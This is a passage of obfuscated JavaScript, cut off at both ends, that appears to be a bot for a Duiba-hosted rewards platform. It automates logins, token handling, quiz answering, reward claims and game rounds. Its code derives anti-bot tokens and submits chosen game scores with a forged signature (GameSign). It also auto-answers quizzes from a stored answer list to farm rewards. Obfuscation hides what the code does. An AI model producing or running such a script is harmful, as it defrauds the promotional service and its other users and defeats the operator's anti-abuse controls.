_0x1e6562=_0x24494b;let _0x50f577=_0x1e6562(0x1f4)+DUIBAURL+_0x1e6562(0x250)+_0x48af53+_0x1e6562(0x2bb)+Date[_0x1e6562(0x2ba)](),_0x1cc8c5={'headers':{'Host':DUIBAURL,'Accept':_0x1e6562(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x1e6562(0x2d1),'Accept-Encoding':_0x1e6562(0x1d2),'Connection':_0x1e6562(0x2cf),'Content-Type':_0x1e6562(0x1f8)},'cookieJar':this['duibaCookieJar']},_0x142590=await got[_0x1e6562(0x288)](_0x50f577,_0x1cc8c5)['json']();return console[_0x1e6562(0x26c)](_0x142590),_0x142590[_0x1e6562(0x1e7)];}async[_0x24494b(0x210)](_0x1eb462){const _0x1b42a5=_0x24494b;let _0x58e416=new Date(),_0x54aa26=_0x58e416[_0x1b42a5(0x29c)](),_0x3d1412=_0x58e416[_0x1b42a5(0x203)]();if(!(_0x54aa26<0x3||_0x54aa26>=0xc||_0x54aa26===0xb&&_0x3d1412>0x1e)){console['log'](_0x1b42a5(0x238));return;}await this[_0x1b42a5(0x291)](_0x1eb462),await $[_0x1b42a5(0x2d5)](0x3e8),await this[_0x1b42a5(0x2c7)](_0x1eb462);let _0xcf3e96=await this[_0x1b42a5(0x269)](_0x1eb462);if(!_0xcf3e96[_0x1b42a5(0x27b)])return;let _0x307bc9=_0xcf3e96[_0x1b42a5(0x1e7)];await $[_0x1b42a5(0x2d5)](0x2710);let _0x4b76fc=0xa,_0x2f4a7a=0x0,_0x691baf=await this[_0x1b42a5(0x1f3)](_0x1eb462,_0x307bc9);while(_0x691baf===0x0&&_0x2f4a7a<_0x4b76fc){await $[_0x1b42a5(0x2d5)](0x7d0),_0x691baf=await this[_0x1b42a5(0x1f3)](_0x1eb462,_0x307bc9),_0x2f4a7a++;}await $[_0x1b42a5(0x2d5)](0x3e8);let _0x1a49bd=await this['getTokenKey'](_0x1eb462),_0x360589=await this[_0x1b42a5(0x237)](_0x1eb462),_0x3460d4=dealToken(_0x360589,_0x1a49bd);await this[_0x1b42a5(0x2cd)](_0x1eb462,_0x307bc9,_0x3460d4),await this[_0x1b42a5(0x226)](_0x1eb462);}async[_0x24494b(0x1d7)](_0x48cef1){const _0x1081be=_0x24494b;let _0x4035fe=_0x1081be(0x1f4)+DUIBAURL+_0x1081be(0x250)+_0x48cef1+_0x1081be(0x28c),_0x5d3aa3={'headers':{'Host':DUIBAURL,'Accept':_0x1081be(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x1081be(0x2d1),'Accept-Encoding':_0x1081be(0x1d2),'Connection':_0x1081be(0x2cf),'Content-Type':'application/x-www-form-urlencoded'},'cookieJar':this[_0x1081be(0x2c9)]},_0x2844c9=await got['get'](_0x4035fe,_0x5d3aa3)[_0x1081be(0x25e)]();}async[_0x24494b(0x227)](_0x173f64){const _0x380e72=_0x24494b;let _0x2868b5=_0x380e72(0x1f4)+DUIBAURL+'/projectx/'+_0x173f64+_0x380e72(0x20d)+Date[_0x380e72(0x2ba)](),_0x2deaaf={'headers':{'Host':DUIBAURL,'Accept':_0x380e72(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':_0x380e72(0x1d2),'Connection':_0x380e72(0x2cf),'Content-Type':_0x380e72(0x1f8)},'cookieJar':this[_0x380e72(0x2c9)]},_0x471c50=await got['get'](_0x2868b5,_0x2deaaf)[_0x380e72(0x28d)]();return console[_0x380e72(0x26c)](_0x471c50),_0x471c50[_0x380e72(0x1e7)];}async[_0x24494b(0x2dc)](_0x3d8bdb){const _0x340f44=_0x24494b;let _0x442d23=_0x340f44(0x1f4)+DUIBAURL+'/projectx/'+_0x3d8bdb+_0x340f44(0x23f)+Date[_0x340f44(0x2ba)](),_0x5e9682={'headers':{'Host':DUIBAURL,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':_0x340f44(0x1d2),'Connection':'keep-alive','Content-Type':_0x340f44(0x1f8)},'cookieJar':this[_0x340f44(0x2c9)]},_0x4c2808=await got[_0x340f44(0x288)](_0x442d23,_0x5e9682)[_0x340f44(0x28d)]();return console['log'](_0x4c2808[_0x340f44(0x1e7)]),_0x4c2808['data'][_0x340f44(0x2c6)];}async[_0x24494b(0x262)](_0x277f8f,_0x1b46b1,_0x24e7ba){const _0x3f3fc6=_0x24494b;let _0x160a12='https://'+DUIBAURL+_0x3f3fc6(0x250)+_0x277f8f+'/kwwAnswer/check.do?answer='+_0x24e7ba+_0x3f3fc6(0x1d8)+_0x1b46b1+_0x3f3fc6(0x2c5)+Date[_0x3f3fc6(0x2ba)](),_0x15aa68={'headers':{'Host':DUIBAURL,'Accept':_0x3f3fc6(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x3f3fc6(0x2d1),'Accept-Encoding':_0x3f3fc6(0x1d2),'Connection':_0x3f3fc6(0x2cf),'Content-Type':'application/x-www-form-urlencoded'},'cookieJar':this[_0x3f3fc6(0x2c9)]},_0x4e6395=await got[_0x3f3fc6(0x288)](_0x160a12,_0x15aa68)[_0x3f3fc6(0x28d)]();return console[_0x3f3fc6(0x26c)](_0x4e6395),_0x4e6395[_0x3f3fc6(0x1e7)];}async[_0x24494b(0x24b)](_0x1acfb7,_0x8014a1){const _0x291a9b=_0x24494b;let _0x3c581f=_0x291a9b(0x1f4)+DUIBAURL+_0x291a9b(0x250)+_0x1acfb7+'/kwwAnswer/complete.do?token='+_0x8014a1+_0x291a9b(0x2c5)+Date[_0x291a9b(0x2ba)](),_0x3b82cd={'headers':{'Host':DUIBAURL,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cookie':'','User-Agent':ua,'Accept-Language':_0x291a9b(0x2d1),'Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':'keep-alive','Content-Type':_0x291a9b(0x1f8)},'cookieJar':this[_0x291a9b(0x2c9)]},_0x492812=await got[_0x291a9b(0x288)](_0x3c581f,_0x3b82cd)[_0x291a9b(0x28d)]();console[_0x291a9b(0x26c)](_0x492812);}async[_0x24494b(0x244)](_0x57191e){const _0x5785ec=_0x24494b;try{await this[_0x5785ec(0x1d7)](_0x57191e),await $[_0x5785ec(0x2d5)](0x3e8),await this[_0x5785ec(0x227)](_0x57191e);let _0x5e7672=await this[_0x5785ec(0x2dc)](_0x57191e);for(let _0x37a25e of _0x5e7672){if(_0x37a25e['answered'])continue;let _0x5f613e;if(!(_0x37a25e['id']in answerDict)){if(!dtManual)_0x5f613e=0x1;else{console[_0x5785ec(0x26c)](_0x5785ec(0x20c)),console[_0x5785ec(0x26c)](_0x37a25e[_0x5785ec(0x20f)]);let _0x277032=_0x37a25e[_0x5785ec(0x2b8)][_0x5785ec(0x294)]('||');for(let _0x518ea1=0x0;_0x518ea1<_0x277032[_0x5785ec(0x27c)];_0x518ea1++)console['log'](_0x518ea1+0x1+'\x20'+_0x277032[_0x518ea1]);_0x5f613e=rlsyn['questionInt'](_0x5785ec(0x1e2));}}else _0x5f613e=answerDict[_0x37a25e['id']];let _0x4b121f=await this[_0x5785ec(0x262)](_0x57191e,_0x37a25e['id'],_0x5f613e);console[_0x5785ec(0x26c)](_0x4b121f[_0x5785ec(0x27b)]),answerDict[_0x37a25e['id']]=_0x4b121f[_0x5785ec(0x278)],console['log']('更新'+_0x37a25e['id']+_0x5785ec(0x2a6)+_0x4b121f[_0x5785ec(0x278)]);}let _0x2a6be3=await this[_0x5785ec(0x220)](_0x57191e),_0x8b92dc=await this['getToken'](_0x57191e),_0x4ad783=dealToken(_0x8b92dc,_0x2a6be3);await this[_0x5785ec(0x24b)](_0x57191e,_0x4ad783);}catch(_0x3cd1fb){console[_0x5785ec(0x26c)](_0x3cd1fb);}}async[_0x24494b(0x2a0)](_0x372d2a){const _0x36d358=_0x24494b;let _0x31e1d3=_0x36d358(0x1f4)+DUIBAURL+_0x36d358(0x250)+_0x372d2a+_0x36d358(0x28c),_0x1a9e7b={'headers':{'Host':DUIBAURL,'Accept':_0x36d358(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x36d358(0x2d1),'Accept-Encoding':_0x36d358(0x1d2),'Connection':_0x36d358(0x2cf),'Content-Type':_0x36d358(0x1f8)},'cookieJar':this[_0x36d358(0x2c9)]},_0x4c41b3=await got['get'](_0x31e1d3,_0x1a9e7b)[_0x36d358(0x25e)]();}async[_0x24494b(0x2a3)](_0x5eb316){const _0x3ee614=_0x24494b;let _0xaa2118=_0x3ee614(0x1f4)+DUIBAURL+_0x3ee614(0x250)+_0x5eb316+_0x3ee614(0x23e)+Date[_0x3ee614(0x2ba)](),_0x4c82dc={'headers':{'Host':DUIBAURL,'Origin':_0x3ee614(0x1f4)+DUIBAURL,'Referer':_0x3ee614(0x1f4)+DUIBAURL+'/projectx/'+_0x5eb316+_0x3ee614(0x28c),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':_0x3ee614(0x1d2),'Connection':'keep-alive','Content-Type':_0x3ee614(0x1f8)},'cookieJar':this['duibaCookieJar']},_0x418128=await got['get'](_0xaa2118,_0x4c82dc)['json']();return console[_0x3ee614(0x26c)](_0x418128),_0x418128['data'];}async[_0x24494b(0x1d6)](_0x110d23,_0x463df1){const _0x40a11e=_0x24494b;let _0x1771a4=_0x40a11e(0x1f4)+DUIBAURL+'/projectx/'+_0x110d23+_0x40a11e(0x222)+Date[_0x40a11e(0x2ba)](),_0x4e1050={'headers':{'Host':DUIBAURL,'Origin':'https://'+DUIBAURL,'Referer':_0x40a11e(0x1f4)+DUIBAURL+'/projectx/'+_0x110d23+_0x40a11e(0x28c),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cookie':'','User-Agent':ua,'Accept-Language':_0x40a11e(0x2d1),'Accept-Encoding':_0x40a11e(0x1d2),'Connection':_0x40a11e(0x2cf),'Content-Type':_0x40a11e(0x1f8)},'cookieJar':this['duibaCookieJar'],'body':_0x40a11e(0x1f5)+_0x463df1+_0x40a11e(0x2c5)+Date['now']()},_0x50b426=await got[_0x40a11e(0x2bd)](_0x1771a4,_0x4e1050)[_0x40a11e(0x28d)]();console[_0x40a11e(0x26c)](_0x50b426);}async['ClaimNewReward'](_0x199291,_0x79d1d3){const _0x3c8094=_0x24494b;let _0x3bb7e9=_0x3c8094(0x1f4)+DUIBAURL+'/projectx/'+_0x199291+_0x3c8094(0x2d4)+Date[_0x3c8094(0x2ba)](),_0x2006f5={'headers':{'Host':DUIBAURL,'Origin':'https://'+DUIBAURL,'Referer':_0x3c8094(0x1f4)+DUIBAURL+'/projectx/'+_0x199291+_0x3c8094(0x28c),'Accept':_0x3c8094(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x3c8094(0x2d1),'Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':'keep-alive','Content-Type':_0x3c8094(0x1f8)},'cookieJar':this[_0x3c8094(0x2c9)],'body':_0x3c8094(0x1f5)+_0x79d1d3+_0x3c8094(0x2c5)+Date[_0x3c8094(0x2ba)]()},_0x4663f3=await got['post'](_0x3bb7e9,_0x2006f5)[_0x3c8094(0x28d)]();console[_0x3c8094(0x26c)](_0x4663f3);}async[_0x24494b(0x2bc)](_0x28ba88,_0x273042){const _0x1bf1b4=_0x24494b;let _0x36fd86='https://'+DUIBAURL+_0x1bf1b4(0x250)+_0x28ba88+_0x1bf1b4(0x224)+Date['now'](),_0x333bcb={'headers':{'Host':DUIBAURL,'Origin':_0x1bf1b4(0x1f4)+DUIBAURL,'Referer':_0x1bf1b4(0x1f4)+DUIBAURL+_0x1bf1b4(0x250)+_0x28ba88+_0x1bf1b4(0x28c),'Accept':_0x1bf1b4(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':_0x1bf1b4(0x1d2),'Connection':_0x1bf1b4(0x2cf),'Content-Type':_0x1bf1b4(0x1f8)},'cookieJar':this['duibaCookieJar'],'body':_0x1bf1b4(0x1f5)+_0x273042+_0x1bf1b4(0x2c5)+Date[_0x1bf1b4(0x2ba)]()},_0x5ad0a5=await got['post'](_0x36fd86,_0x333bcb)[_0x1bf1b4(0x28d)]();console['log'](_0x5ad0a5);}async[_0x24494b(0x2b1)](_0x3d1bd9,_0x11479f){const _0x1fd216=_0x24494b;let _0x134784='https://'+DUIBAURL+_0x1fd216(0x250)+_0x3d1bd9+_0x1fd216(0x284)+Date[_0x1fd216(0x2ba)](),_0x28f705={'headers':{'Host':DUIBAURL,'Origin':_0x1fd216(0x1f4)+DUIBAURL,'Referer':'https://'+DUIBAURL+'/projectx/'+_0x3d1bd9+_0x1fd216(0x28c),'Accept':_0x1fd216(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x1fd216(0x2d1),'Accept-Encoding':_0x1fd216(0x1d2),'Connection':_0x1fd216(0x2cf),'Content-Type':_0x1fd216(0x1f8)},'cookieJar':this[_0x1fd216(0x2c9)],'body':_0x1fd216(0x1f5)+_0x11479f+'&user_type=0&is_from_share=1&_t='+Date[_0x1fd216(0x2ba)]()},_0x46b521=await got[_0x1fd216(0x2bd)](_0x134784,_0x28f705)[_0x1fd216(0x28d)]();console[_0x1fd216(0x26c)](_0x46b521);}async[_0x24494b(0x1c3)](_0x3440fa,_0x434d77){const _0x2d558d=_0x24494b;let _0x307a3d=_0x2d558d(0x1f4)+DUIBAURL+_0x2d558d(0x250)+_0x3440fa+_0x2d558d(0x215)+Date[_0x2d558d(0x2ba)](),_0x3e55a7={'headers':{'Host':DUIBAURL,'Origin':_0x2d558d(0x1f4)+DUIBAURL,'Referer':_0x2d558d(0x1f4)+DUIBAURL+_0x2d558d(0x250)+_0x3440fa+_0x2d558d(0x28c),'Accept':_0x2d558d(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':_0x2d558d(0x1d2),'Connection':_0x2d558d(0x2cf),'Content-Type':_0x2d558d(0x1f8)},'cookieJar':this[_0x2d558d(0x2c9)],'body':_0x2d558d(0x1f5)+_0x434d77+'&user_type=0&is_from_share=1&_t='+Date[_0x2d558d(0x2ba)]()},_0x1bd53d=await got['post'](_0x307a3d,_0x3e55a7)[_0x2d558d(0x28d)]();console['log'](_0x1bd53d);}async[_0x24494b(0x223)](_0xfe13b1,_0x387458){const _0x17961d=_0x24494b;let _0x4703e1=_0x17961d(0x1f4)+DUIBAURL+_0x17961d(0x250)+_0xfe13b1+_0x17961d(0x27a)+Date[_0x17961d(0x2ba)](),_0x2970ea={'headers':{'Host':DUIBAURL,'Origin':_0x17961d(0x1f4)+DUIBAURL,'Referer':'https://'+DUIBAURL+_0x17961d(0x250)+_0xfe13b1+_0x17961d(0x28c),'Accept':_0x17961d(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x17961d(0x2d1),'Accept-Encoding':_0x17961d(0x1d2),'Connection':'keep-alive','Content-Type':_0x17961d(0x1f8)},'cookieJar':this['duibaCookieJar'],'body':_0x17961d(0x1f5)+_0x387458+_0x17961d(0x2c5)+Date[_0x17961d(0x2ba)]()},_0x7e5cce=await got[_0x17961d(0x2bd)](_0x4703e1,_0x2970ea)[_0x17961d(0x28d)]();console[_0x17961d(0x26c)](_0x7e5cce);}async[_0x24494b(0x2d2)](_0xc3990a,_0x1ee75b){const _0x26459d=_0x24494b;let _0x263eda=_0x26459d(0x1f4)+DUIBAURL+_0x26459d(0x250)+_0xc3990a+_0x26459d(0x29d)+Date[_0x26459d(0x2ba)](),_0x1f8e42={'headers':{'Host':DUIBAURL,'Origin':_0x26459d(0x1f4)+DUIBAURL,'Referer':_0x26459d(0x1f4)+DUIBAURL+_0x26459d(0x250)+_0xc3990a+_0x26459d(0x28c),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cookie':'','User-Agent':ua,'Accept-Language':_0x26459d(0x2d1),'Accept-Encoding':_0x26459d(0x1d2),'Connection':_0x26459d(0x2cf),'Content-Type':_0x26459d(0x1f8)},'cookieJar':this[_0x26459d(0x2c9)],'body':_0x26459d(0x1f5)+_0x1ee75b+_0x26459d(0x2c5)+Date['now']()},_0x15b3f4=await got[_0x26459d(0x2bd)](_0x263eda,_0x1f8e42)[_0x26459d(0x28d)]();console[_0x26459d(0x26c)](_0x15b3f4);}async[_0x24494b(0x29f)](_0x3bee6a,_0x1ae3c6){const _0x456f87=_0x24494b;let _0x26627a='https://'+DUIBAURL+_0x456f87(0x250)+_0x3bee6a+_0x456f87(0x257)+Date[_0x456f87(0x2ba)](),_0xb6a31={'headers':{'Host':DUIBAURL,'Origin':_0x456f87(0x1f4)+DUIBAURL,'Referer':_0x456f87(0x1f4)+DUIBAURL+_0x456f87(0x250)+_0x3bee6a+_0x456f87(0x28c),'Accept':_0x456f87(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':_0x456f87(0x2cf),'Content-Type':_0x456f87(0x1f8)},'cookieJar':this['duibaCookieJar'],'body':'token='+_0x1ae3c6+_0x456f87(0x2c5)+Date[_0x456f87(0x2ba)]()},_0x5dcfb5=await got[_0x456f87(0x2bd)](_0x26627a,_0xb6a31)['json']();return console[_0x456f87(0x26c)](_0x5dcfb5),_0x5dcfb5;}async[_0x24494b(0x239)](_0x150a72){const _0x218449=_0x24494b;let _0xd76235=_0x218449(0x1f4)+DUIBAURL+_0x218449(0x250)+_0x150a72+_0x218449(0x2b6)+Date[_0x218449(0x2ba)](),_0x26ac4a={'headers':{'Host':DUIBAURL,'Origin':_0x218449(0x1f4)+DUIBAURL,'Referer':_0x218449(0x1f4)+DUIBAURL+_0x218449(0x250)+_0x150a72+'/index.html?appID=89420&from=login&spm=89420.1.1.1','Accept':_0x218449(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x218449(0x2d1),'Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':_0x218449(0x2cf),'Content-Type':'application/x-www-form-urlencoded'},'cookieJar':this[_0x218449(0x2c9)]},_0x712646=await got[_0x218449(0x288)](_0xd76235,_0x26ac4a)[_0x218449(0x28d)]();return console['log'](_0x712646),_0x712646['data'];}async[_0x24494b(0x1f0)](_0x4ae427,_0x1c2b9c,_0x1f1e6e){const _0x12dd5f=_0x24494b;let _0x358677=_0x12dd5f(0x1f4)+DUIBAURL+_0x12dd5f(0x250)+_0x4ae427+_0x12dd5f(0x22d)+Date[_0x12dd5f(0x2ba)](),_0x15a289={'headers':{'Host':DUIBAURL,'Origin':'https://'+DUIBAURL,'Referer':'https://'+DUIBAURL+_0x12dd5f(0x250)+_0x4ae427+_0x12dd5f(0x28c),'Accept':_0x12dd5f(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':_0x12dd5f(0x2cf),'Content-Type':'application/x-www-form-urlencoded'},'cookieJar':this[_0x12dd5f(0x2c9)],'body':_0x12dd5f(0x280)+_0x1f1e6e+_0x12dd5f(0x219)+_0x1c2b9c+'&user_type=0&is_from_share=1&_t='+Date[_0x12dd5f(0x2ba)]()},_0x2119e2=await got['post'](_0x358677,_0x15a289)[_0x12dd5f(0x28d)]();console['log'](_0x2119e2);}async['duibaPlant'](_0x2f8510){const _0x39285b=_0x24494b;try{await this[_0x39285b(0x2a0)](_0x2f8510),await $[_0x39285b(0x2d5)](0x3e8);let _0x88229c=await this[_0x39285b(0x2a3)](_0x2f8510),_0x56ce8f=await this[_0x39285b(0x220)](_0x2f8510),_0xf8d512,_0x4ee172;!_0x88229c[_0x39285b(0x1ee)]&&(_0xf8d512=await this['getToken'](_0x2f8510),_0x4ee172=dealToken(_0xf8d512,_0x56ce8f),await this[_0x39285b(0x2b1)](_0x2f8510,_0x4ee172));_0xf8d512=await this['getToken'](_0x2f8510),_0x4ee172=dealToken(_0xf8d512,_0x56ce8f),await this[_0x39285b(0x2d2)](_0x2f8510,_0x4ee172);let _0x543bfe=await this[_0x39285b(0x239)](_0x2f8510);for(let _0x538a28 of _0x543bfe[_0x39285b(0x1c7)]){if(_0x538a28['completedSize']>0x0)continue;_0x538a28[_0x39285b(0x270)]['indexOf'](_0x39285b(0x1df))>=0x0&&(_0xf8d512=await this[_0x39285b(0x237)](_0x2f8510),_0x4ee172=dealToken(_0xf8d512,_0x56ce8f),await this[_0x39285b(0x1f0)](_0x2f8510,_0x4ee172,_0x538a28[_0x39285b(0x270)]));}_0x88229c=await this[_0x39285b(0x2a3)](_0x2f8510);for(let _0x4bc042=0x0;_0x4bc042<_0x88229c['leftEnergyBall']||0x0;_0x4bc042++){_0xf8d512=await this[_0x39285b(0x237)](_0x2f8510),_0x4ee172=dealToken(_0xf8d512,_0x56ce8f);let _0x536a2f=await this[_0x39285b(0x29f)](_0x2f8510,_0x4ee172);if(_0x536a2f['code']==0x7a154){console['log']('账号'+this[_0x39285b(0x2c8)]+_0x39285b(0x20a)),_0xf8d512=await this[_0x39285b(0x237)](_0x2f8510),_0x4ee172=dealToken(_0xf8d512,_0x56ce8f),await this[_0x39285b(0x223)](_0x2f8510,_0x4ee172);break;}}}catch(_0x22265f){console[_0x39285b(0x26c)](_0x22265f);}}async[_0x24494b(0x1c5)](_0x9bb00d){const _0x5892bb=_0x24494b;let _0x4232a1='https://'+DUIBAURL+_0x5892bb(0x1ed)+_0x9bb00d+_0x5892bb(0x204),_0x25cb8b={'headers':{'Host':DUIBAURL,'Accept':_0x5892bb(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':_0x5892bb(0x1d2),'Connection':_0x5892bb(0x2cf),'Content-Type':_0x5892bb(0x1f8)},'cookieJar':this[_0x5892bb(0x2c9)]},_0x53806f=await got[_0x5892bb(0x288)](_0x4232a1,_0x25cb8b)[_0x5892bb(0x25e)]();return _0x53806f;}async[_0x24494b(0x26a)](_0x56b4ac){const _0xeab076=_0x24494b;let _0x4e8d0e=_0xeab076(0x1f4)+DUIBAURL+_0xeab076(0x266)+Date['now']()+_0xeab076(0x289)+_0x56b4ac,_0x3eb8e0={'headers':{'Host':DUIBAURL,'Accept':_0xeab076(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0xeab076(0x2d1),'Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':_0xeab076(0x2cf),'Content-Type':'application/x-www-form-urlencoded'},'cookieJar':this[_0xeab076(0x2c9)]},_0x207def=await got[_0xeab076(0x288)](_0x4e8d0e,_0x3eb8e0)[_0xeab076(0x28d)]();return _0x207def[_0xeab076(0x1e7)];}async['StartGame'](_0x1e289c){const _0x36d0b2=_0x24494b;let _0x31bdf2=_0x36d0b2(0x1f4)+DUIBAURL+'/aaw/underseaGame/start?__ts__='+Date[_0x36d0b2(0x2ba)](),_0x6b8a53={'headers':{'Host':DUIBAURL,'Accept':_0x36d0b2(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':_0x36d0b2(0x2cf),'Content-Type':_0x36d0b2(0x1f8)},'cookieJar':this[_0x36d0b2(0x2c9)],'body':_0x36d0b2(0x276)+_0x1e289c},_0x2dc2e6=await got[_0x36d0b2(0x2bd)](_0x31bdf2,_0x6b8a53)[_0x36d0b2(0x28d)]();return console[_0x36d0b2(0x26c)](_0x2dc2e6),_0x2dc2e6['data'];}async[_0x24494b(0x26e)](_0x5c5669,_0x3e156b,_0xadae15){const _0x3d43e5=_0x24494b;let _0x5c129e=_0x3d43e5(0x1f4)+DUIBAURL+_0x3d43e5(0x254)+Date[_0x3d43e5(0x2ba)]()+_0x3d43e5(0x289)+_0x5c5669+_0x3d43e5(0x22e)+_0x3e156b+_0x3d43e5(0x23b)+_0xadae15+_0x3d43e5(0x2d0),_0x1e6320={'headers':{'Host':DUIBAURL,'Accept':_0x3d43e5(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':_0x3d43e5(0x1d2),'Connection':'keep-alive','Content-Type':_0x3d43e5(0x1f8)},'cookieJar':this[_0x3d43e5(0x2c9)]},_0x10945a=await got['get'](_0x5c129e,_0x1e6320)[_0x3d43e5(0x28d)]();return console[_0x3d43e5(0x26c)](_0x10945a),_0x10945a[_0x3d43e5(0x1e7)];}async[_0x24494b(0x1d9)](_0x33639e,_0x37476b,_0x21a1c7){const _0x536577=_0x24494b;let _0x136aab='https://'+DUIBAURL+_0x536577(0x2c0)+Date['now'](),_0x71eae9={'headers':{'Host':DUIBAURL,'Accept':_0x536577(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x536577(0x2d1),'Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':'keep-alive','Content-Type':_0x536577(0x1f8)},'cookieJar':this[_0x536577(0x2c9)],'body':'opId='+_0x33639e+_0x536577(0x22e)+_0x37476b+_0x536577(0x28b)+_0x21a1c7},_0x596d28=await got[_0x536577(0x2bd)](_0x136aab,_0x71eae9)['json']();return console[_0x536577(0x26c)](_0x596d28),_0x596d28['data'];}async['SubmitGame'](_0x12787e,_0x450d72,_0x128ba5,_0x2179b5,_0x1fb04f,_0x443ad7){const _0x59ec65=_0x24494b;let _0x258f1b=_0x59ec65(0x1f4)+DUIBAURL+'/aaw/underseaGame/submit?__ts__='+Date[_0x59ec65(0x2ba)](),_0x2243d6=_0x59ec65(0x276)+_0x12787e+'&startId='+_0x450d72+_0x59ec65(0x1d5)+_0x128ba5+'&totalScore='+_0x2179b5+_0x59ec65(0x28b)+_0x1fb04f,_0x577d72=GameSign(_0x2243d6,_0x443ad7),_0x4648a5={'headers':{'Host':DUIBAURL,'Accept':_0x59ec65(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x59ec65(0x2d1),'Accept-Encoding':_0x59ec65(0x1d2),'Connection':_0x59ec65(0x2cf),'Content-Type':_0x59ec65(0x1f8)},'cookieJar':this[_0x59ec65(0x2c9)],'body':_0x2243d6+_0x59ec65(0x236)+_0x577d72},_0xfebdbc=await got[_0x59ec65(0x2bd)](_0x258f1b,_0x4648a5)['json']();return console['log'](_0xfebdbc),_0xfebdbc[_0x59ec65(0x1e7)];}async['DrawGame'](_0x404f5a,_0x2885af,_0x1ec25b){const _0x2fc8c5=_0x24494b;let _0x2d8f90=_0x2fc8c5(0x1f4)+DUIBAURL+'/aaw/underseaGame/draw?__ts__='+Date[_0x2fc8c5(0x2ba)](),_0x3a9037={'headers':{'Host':DUIBAURL,'Accept':_0x2fc8c5(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':_0x2fc8c5(0x2cf),'Content-Type':_0x2fc8c5(0x1f8)},'cookieJar':this[_0x2fc8c5(0x2c9)],'body':_0x2fc8c5(0x276)+_0x404f5a+_0x2fc8c5(0x22e)+_0x2885af+'&roundIndex='+_0x1ec25b},_0x39f85e=await got[_0x2fc8c5(0x2bd)](_0x2d8f90,_0x3a9037)[_0x2fc8c5(0x28d)]();return console[_0x2fc8c5(0x26c)](_0x39f85e),_0x39f85e[_0x2fc8c5(0x1e7)];}async[_0x24494b(0x27e)](){const _0x24ce4d=_0x24494b;let _0x4c2bf6=_0x24ce4d(0x1f4)+DUIBAURL+_0x24ce4d(0x22b)+Date[_0x24ce4d(0x2ba)]()+_0x24ce4d(0x298),_0x51ac5c={'headers':{'Host':DUIBAURL,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cookie':'','User-Agent':ua,'Accept-Language':_0x24ce4d(0x2d1),'Accept-Encoding':_0x24ce4d(0x1d2),'Connection':_0x24ce4d(0x2cf),'Content-Type':_0x24ce4d(0x1f8)},'cookieJar':this[_0x24ce4d(0x2c9)]},_0x3f02ee=await got[_0x24ce4d(0x288)](_0x4c2bf6,_0x51ac5c);console[_0x24ce4d(0x26c)](_0x3f02ee[_0x24ce4d(0x25e)]);}async[_0x24494b(0x21f)](){const _0x3dfce4=_0x24494b;try{let _0x1d628d='202214587511596',_0x1b31ce=await this[_0x3dfce4(0x1c5)](_0x1d628d),_0x5beb35=ParseHtmlGame(_0x1b31ce),_0x58645d=_0x5beb35[_0x3dfce4(0x1ca)],_0x397cbb=await this['GetInfoGame'](_0x1d628d);console[_0x3dfce4(0x26c)](_0x3dfce4(0x28f));for(let _0x23943e=0x0;_0x23943e<_0x397cbb[_0x3dfce4(0x2b3)]||0x0;_0x23943e++){if(_0x23943e>0x0)await $[_0x3dfce4(0x2d5)](0xea60);let _0xf0f38e=0x3;await this['Click']();let _0x44bfeb=await this['StartGame'](_0x1d628d),_0x46ba0b=_0x44bfeb[_0x3dfce4(0x1da)],_0xb0a6bb=_0x44bfeb['orderNum'];if(!_0x46ba0b||!_0xb0a6bb)break;let _0x1e9b1f,_0x18a5c5=0x0;const _0x17cc88=0xa;do{_0x1e9b1f=await this['getOrderStatusGame'](_0x1d628d,_0x46ba0b,_0xb0a6bb),await $[_0x3dfce4(0x2d5)](0xfa0),_0x18a5c5++;}while(_0x1e9b1f!==0x2&&_0x18a5c5<_0x17cc88);if(_0x1e9b1f!==0x2)continue;let _0xb79166=[];for(let _0x2bc26c=0x1;_0x2bc26c<=_0xf0f38e;_0x2bc26c++){_0xb79166['push'](_0x2bc26c),await this[_0x3dfce4(0x1d9)](_0x1d628d,_0x46ba0b,_0x2bc26c);let 